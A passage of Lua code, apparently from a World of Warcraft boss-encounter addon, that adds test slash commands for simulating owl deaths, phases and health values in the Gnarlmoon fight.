            self:Message("Test mode: Owl Enrage", "Positive")
        elseif msg == "killredowl1" then
            -- Simulate first red owl death
            redOwl1Died = true
            redOwl1Hp = 0
            self:CheckOwlDeath()
            self:Message("Test mode: Killed Red Owl 1", "Positive")
        elseif msg == "killredowl2" then
            -- Simulate second red owl death
            redOwl2Died = true
            redOwl2Hp = 0
            self:CheckOwlDeath()
            self:Message("Test mode: Killed Red Owl 2", "Positive")
        elseif msg == "killblueowl1" then
            -- Simulate first blue owl death
            blueOwl1Died = true
            blueOwl1Hp = 0
            self:CheckOwlDeath()
            self:Message("Test mode: Killed Blue Owl 1", "Positive")
        elseif msg == "killblueowl2" then
            -- Simulate second blue owl death
            blueOwl2Died = true
            blueOwl2Hp = 0
            self:CheckOwlDeath()
            self:Message("Test mode: Killed Blue Owl 2", "Positive")
        elseif msg == "killallowls" then
            -- Simulate all owls dying
            redOwl1Died = true
            redOwl2Died = true
            blueOwl1Died = true
            blueOwl2Died = true
            redOwl1Hp = 0
            redOwl2Hp = 0
            blueOwl1Hp = 0
            blueOwl2Hp = 0
            self:CheckOwlDeath()
            self:Message("Test mode: Killed all Owls", "Positive")
        elseif msg == "help" then
            -- Show help message
            self:Message("Gnarlmoon Test Commands:\n/gnarlmoontest start - Start simulation\n/gnarlmoontest stop - Stop simulation\n/gnarlmoontest redmoon - Apply Red Moon\n/gnarlmoontest bluemoon - Apply Blue Moon\n/gnarlmoontest lunarshift - Cast Lunar Shift\n/gnarlmoontest owlphase - Start Owl phase\n/gnarlmoontest owlenrage - Enrage Owls\n/gnarlmoontest killredowl1 - Kill Red Owl 1\n/gnarlmoontest killredowl2 - Kill Red Owl 2\n/gnarlmoontest killblueowl1 - Kill Blue Owl 1\n/gnarlmoontest killblueowl2 - Kill Blue Owl 2\n/gnarlmoontest killallowls - Kill all Owls", "Positive")
        else
            -- Unknown command
            self:Message("Unknown test command. Type /gnarlmoontest help for a list of commands", "Negative")
        end
    end
    SLASH_GNARLMOONTEST1 = "/gnarlmoontest"
    
    -- Add simulated owl spawning for testing
    self:EnableSimulatedOwls()
    
    self:Message("Gnarlmoon test mode enabled. Type /gnarlmoontest help for commands", "Positive")
end

function module:EnableSimulatedOwls()
    -- Create simulated owl data for testing
    self.simulatedOwls = {
        redOwl1 = {name = L["trigger_redowl"], health = 100, maxHealth = 100},
        redOwl2 = {name = L["trigger_redowl"], health = 100, maxHealth = 100},
        blueOwl1 = {name = L["trigger_blueowl"], health = 100, maxHealth = 100},
        blueOwl2 = {name = L["trigger_blueowl"], health = 100, maxHealth = 100}
    }
    
    -- Hook into CheckOwlHps to use simulated data
    self.originalCheckOwlHps = self.CheckOwlHps
    self.CheckOwlHps = function(self)
        if not inOwlPhase then return end
        
        -- Use simulated owl data
        if self.simulatedOwls then
            if not redOwl1Died then redOwl1Hp = self.simulatedOwls.redOwl1.health end
            if not redOwl2Died then redOwl2Hp = self.simulatedOwls.redOwl2.health end
            if not blueOwl1Died then blueOwl1Hp = self.simulatedOwls.blueOwl1.health end
            if not blueOwl2Died then blueOwl2Hp = self.simulatedOwls.blueOwl2.health end
        end
        
        self:UpdateOwlStatusFrame()
    end
    
    -- Add command to adjust HP
    SlashCmdList["OWLHP"] = function(msg)
        local owl, hp = strsplit(" ", msg)
        hp = tonumber(hp)
        
        if not hp or hp < 0 or hp > 100 then
            self:Message("Invalid HP value. Use: /owlhp [redowl1|redowl2|blueowl1|blueowl2] [0-100]", "Negative")
            return
        end
        
        if owl == "redowl1" and self.simulatedOwls.redOwl1 then
            self.simulatedOwls.redOwl1.health = hp
            self:Message("Red Owl 1 HP set to " .. hp .. "%", "Positive")
        elseif owl == "redowl2" and self.simulatedOwls.redOwl2 then
            self.simulatedOwls.redOwl2.health = hp
            self:Message("Red Owl 2 HP set to " .. hp .. "%", "Positive")
        elseif owl == "blueowl1" and self.simulatedOwls.blueOwl1 then
            self.simulatedOwls.blueOwl1.health = hp
            self:Message("Blue Owl 1 HP set to " .. hp .. "%", "Positive")
        elseif owl == "blueowl2" and self.simulatedOwls.blueOwl2 then
            self.simulatedOwls.blueOwl2.health = hp
            self:Message("Blue Owl 2 HP set to " .. hp .. "%", "Positive")
        else
            self:Message("Invalid owl name. Use: redowl1, redowl2, blueowl1, or blueowl2", "Negative")
        end
    end
    SLASH_OWLHP1 = "/owlhp"
end

-- Call this in OnEnable to enable testing
self:SetupTestingCommands()